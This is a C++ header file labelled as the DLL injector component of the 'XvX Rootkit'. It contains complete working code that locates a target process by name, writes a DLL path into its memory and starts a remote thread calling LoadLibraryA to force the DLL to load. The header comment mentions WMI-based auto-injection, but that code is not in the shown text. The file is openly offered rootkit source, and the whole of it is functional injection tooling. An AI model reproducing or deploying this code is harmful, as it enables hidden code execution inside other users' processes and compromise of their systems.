/*
 * XvX Rootkit - DLL Injector Header
 * Copyright (c) 2025 - 28zaakypro@proton.me
 *
 * Multi-process DLL injection with WMI monitoring for auto-injection.
 */

#ifndef MULTIDLLINJECTOR_H
#define MULTIDLLINJECTOR_H

#include <windows.h>
#include <tlhelp32.h>
#include <string>
#include <algorithm>

int getPIDbyProcName(const std::string &procName)
{
    // 1. Convert std::string to std::wstring for wcscmp
    std::wstring wideProcName(procName.begin(), procName.end());

    // 2. Create process snapshot
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE)
    {
        return 0; // Failed
    }

    // 3. Prepare the PROCESSENTRY32W structure
    PROCESSENTRY32W pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32W);

    // 4. Iterate through all processes
    if (Process32FirstW(hSnap, &pe32))
    {
        do
        {
            // Case-insensitive comparison (Windows might return "Notepad.exe" instead of "notepad.exe")
            std::wstring exeFile(pe32.szExeFile);
            std::wstring exeFileLower = exeFile;
            std::wstring procNameLower = wideProcName;

            // Convert to lowercase
            std::transform(exeFileLower.begin(), exeFileLower.end(), exeFileLower.begin(), ::towlower);
            std::transform(procNameLower.begin(), procNameLower.end(), procNameLower.begin(), ::towlower);

            if (exeFileLower == procNameLower)
            {
                CloseHandle(hSnap);
                return pe32.th32ProcessID;
            }
        } while (Process32NextW(hSnap, &pe32));
    }

    // 5. Not found
    CloseHandle(hSnap);
    return 0;
}

bool isDLLInjected(const std::string &dllName, int pid)
{
    // 1. Convert dllName to wstring
    std::wstring wideDllName(dllName.begin(), dllName.end());

    // 2. Create module snapshot of the process
    // TH32CS_SNAPMODULE32 to support 32-bit modules in a 64-bit process
    HANDLE hSnap = CreateToolhelp32Snapshot(
        TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32,
        pid);

    if (hSnap == INVALID_HANDLE_VALUE)
    {
        return false; // Failed (protected or non-existent process)
    }

    // 3. Prepare the MODULEENTRY32W structure
    MODULEENTRY32W me32;
    me32.dwSize = sizeof(MODULEENTRY32W);

    // 4. Iterate through all modules
    if (Module32FirstW(hSnap, &me32))
    {
        do
        {
            // Compare the module name
            if (wcscmp(me32.szModule, wideDllName.c_str()) == 0)
            {
                CloseHandle(hSnap);
                return true; // DLL déjà injectée !
            }
        } while (Module32NextW(hSnap, &me32));
    }

    CloseHandle(hSnap);
    return false;
}

bool injectDLL(const std::string &dllPath, int pid)
{
    // 1. Extract the DLL name from the full path
    std::string dllName = dllPath;
    size_t lastSlash = dllPath.find_last_of("\\/");
    if (lastSlash != std::string::npos)
    {
        dllName = dllPath.substr(lastSlash + 1);
    }

    // 2. Check if already injected
    if (isDLLInjected(dllName, pid))
    {
        return false; // Already injected, no need to reinject
    }

    // 3. Open the target process
    HANDLE hProc = OpenProcess(
        PROCESS_CREATE_THREAD |         // For CreateRemoteThread
            PROCESS_QUERY_INFORMATION | // For state checking
            PROCESS_VM_OPERATION |      // For VirtualAllocEx
            PROCESS_VM_WRITE |          // For WriteProcessMemory
            PROCESS_VM_READ,            // For reading (optional)
        FALSE,                          // No inheritance
        pid);

    if (hProc == NULL)
    {
        return false;
    }

    // 4. Allocate memory in the remote process for the DLL path
    SIZE_T dllPathSize = dllPath.length() + 1;
    LPVOID remoteMem = VirtualAllocEx(
        hProc,
        NULL,
        dllPathSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE);

    if (remoteMem == NULL)
    {
        CloseHandle(hProc);
        return false;
    }

    // 5. Write the DLL path into the remote memory
    BOOL writeSuccess = WriteProcessMemory(
        hProc,
        remoteMem,
        dllPath.c_str(),
        dllPathSize,
        NULL);

    if (!writeSuccess)
    {
        VirtualFreeEx(hProc, remoteMem, 0, MEM_RELEASE);
        CloseHandle(hProc);
        return false;
    }

    // 6. Get the address of LoadLibraryA in kernel32.dll
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    if (hKernel32 == NULL)
    {
        VirtualFreeEx(hProc, remoteMem, 0, MEM_RELEASE);
        CloseHandle(hProc);
        return false;
    }

    LPVOID loadLibAddr = (LPVOID)GetProcAddress(hKernel32, "LoadLibraryA");
    if (loadLibAddr == NULL)
    {
        VirtualFreeEx(hProc, remoteMem, 0, MEM_RELEASE);
        CloseHandle(hProc);
        return false;
    }

    // 7. Create remote thread executing LoadLibraryA(dllPath)
    HANDLE hThread = CreateRemoteThread(
        hProc,
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)loadLibAddr,
        remoteMem,
        0,
        NULL);

    if (hThread == NULL)
    {
        VirtualFreeEx(hProc, remoteMem, 0, MEM_RELEASE);
        CloseHandle(hProc);
        return false;
    }

    // 8. (Optional) Wait for the remote thread to complete
    // LoadLibraryA returns quickly, so we can wait
    WaitForSingleObject(hThread, INFINITE);

    // 9. Check if LoadLibraryA succeeded (exit code != 0 means success)
    DWORD exitCode = 0;
    GetExitCodeThread(hThread, &exitCode);

    // LoadLibraryA failed if exitCode == 0
    bool injectionSuccess = (exitCode != 0);

    // 10. Clean up
    CloseHandle(hThread);
    VirtualFreeEx(hProc, remoteMem, 0, MEM_RELEASE);
    CloseHandle(hProc);

    // If failed == 0, LoadLibraryA failed
    return (exitCode != 0);
}

#endif // MULTIDLLINJECTOR_H
